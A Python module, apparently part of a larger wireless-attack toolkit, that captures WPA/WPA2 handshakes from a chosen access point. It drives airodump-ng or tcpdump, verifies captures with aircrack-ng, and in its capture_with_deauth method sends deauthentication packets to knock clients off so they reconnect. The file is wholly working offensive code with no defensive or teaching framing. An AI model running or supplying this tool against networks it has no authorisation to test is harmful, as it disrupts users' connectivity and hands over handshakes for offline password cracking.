import subprocess
import os
import time
from typing import Dict, Optional
import re

class HandshakeCapture:
    """WPA/WPA2 handshake capture module"""
    
    def __init__(self):
        self.capture_dir = "/tmp/handshakes"
        os.makedirs(self.capture_dir, exist_ok=True)
        self.capturing = False
    
    def capture(self, interface: str, target_bssid: str, 
                channel: int, duration: int = 60) -> Dict:
        """Capture WPA/WPA2 handshake"""
        try:
            self.capturing = True
            timestamp = int(time.time())
            output_file = f"{self.capture_dir}/capture_{timestamp}"
            
            # Set channel
            subprocess.run(
                ['iwconfig', interface, 'channel', str(channel)],
                capture_output=True,
                timeout=5
            )
            
            # Method 1: Try using airodump-ng for capture
            try:
                return self._capture_with_airodump(interface, target_bssid, 
                                                   channel, duration, output_file)
            except Exception as e:
                # Method 2: Fallback to tcpdump/tshark
                return self._capture_with_tcpdump(interface, target_bssid,
                                                  duration, output_file)
        
        except Exception as e:
            self.capturing = False
            return {
                "success": False,
                "error": str(e)
            }
    
    def _capture_with_airodump(self, interface: str, target_bssid: str,
                               channel: int, duration: int, 
                               output_file: str) -> Dict:
        """Capture handshake using airodump-ng"""
        try:
            # Start airodump-ng
            cmd = [
                'airodump-ng',
                '--bssid', target_bssid,
                '--channel', str(channel),
                '-w', output_file,
                '--output-format', 'pcap',
                interface
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Let it capture for specified duration
            time.sleep(duration)
            
            # Stop capture
            process.terminate()
            process.wait(timeout=5)
            
            # Check if handshake was captured
            cap_file = f"{output_file}-01.cap"
            has_handshake = self._verify_handshake(cap_file, target_bssid)
            
            result = {
                "success": has_handshake,
                "target_bssid": target_bssid,
                "channel": channel,
                "duration": duration,
                "capture_file": cap_file if has_handshake else None,
            }
            
            if has_handshake:
                result["message"] = f"Handshake captured successfully!"
            else:
                result["message"] = "No handshake captured. Try deauth attack to force reconnection."
            
            return result
        
        except Exception as e:
            raise e
        finally:
            self.capturing = False
    
    def _capture_with_tcpdump(self, interface: str, target_bssid: str,
                             duration: int, output_file: str) -> Dict:
        """Fallback capture using tcpdump"""
        try:
            pcap_file = f"{output_file}.pcap"
            
            cmd = [
                'tcpdump',
                '-i', interface,
                '-w', pcap_file,
                'ether host', target_bssid
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            time.sleep(duration)
            
            process.terminate()
            process.wait(timeout=5)
            
            return {
                "success": True,
                "message": "Capture completed (handshake verification requires manual check)",
                "target_bssid": target_bssid,
                "capture_file": pcap_file,
                "duration": duration
            }
        
        except Exception as e:
            raise e
        finally:
            self.capturing = False
    
    def _verify_handshake(self, cap_file: str, bssid: str) -> bool:
        """Verify if handshake was captured using aircrack-ng"""
        try:
            if not os.path.exists(cap_file):
                return False
            
            result = subprocess.run(
                ['aircrack-ng', cap_file],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            output = result.stdout + result.stderr
            
            # Check for handshake indicators
            if 'handshake' in output.lower() and bssid.lower() in output.lower():
                return True
            
            return False
        
        except Exception as e:
            return False
    
    def capture_with_deauth(self, interface: str, target_bssid: str,
                           channel: int, duration: int = 60) -> Dict:
        """Capture handshake with automatic deauth to force reconnection"""
        try:
            from core.deauth import DeauthAttack
            
            timestamp = int(time.time())
            output_file = f"{self.capture_dir}/capture_{timestamp}"
            
            # Set channel
            subprocess.run(
                ['iwconfig', interface, 'channel', str(channel)],
                capture_output=True,
                timeout=5
            )
            
            # Start capture
            cmd = [
                'airodump-ng',
                '--bssid', target_bssid,
                '--channel', str(channel),
                '-w', output_file,
                '--output-format', 'pcap',
                interface
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Wait a bit for capture to start
            time.sleep(3)
            
            # Send deauth packets to force reconnection
            deauth = DeauthAttack()
            deauth_result = deauth.execute(interface, target_bssid, None, 20)
            
            # Continue capturing
            time.sleep(duration - 3)
            
            # Stop capture
            process.terminate()
            process.wait(timeout=5)
            
            # Verify handshake
            cap_file = f"{output_file}-01.cap"
            has_handshake = self._verify_handshake(cap_file, target_bssid)
            
            return {
                "success": has_handshake,
                "target_bssid": target_bssid,
                "channel": channel,
                "capture_file": cap_file if has_handshake else None,
                "deauth_sent": deauth_result.get('success', False),
                "message": "Handshake captured!" if has_handshake else "No handshake captured"
            }
        
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
        finally:
            self.capturing = False
    
    def list_captures(self) -> list:
        """List all captured files"""
        try:
            files = os.listdir(self.capture_dir)
            captures = []
            
            for f in files:
                if f.endswith('.cap') or f.endswith('.pcap'):
                    filepath = os.path.join(self.capture_dir, f)
                    stat = os.stat(filepath)
                    captures.append({
                        'filename': f,
                        'path': filepath,
                        'size': stat.st_size,
                        'created': stat.st_ctime
                    })
            
            return sorted(captures, key=lambda x: x['created'], reverse=True)
        
        except Exception as e:
            return []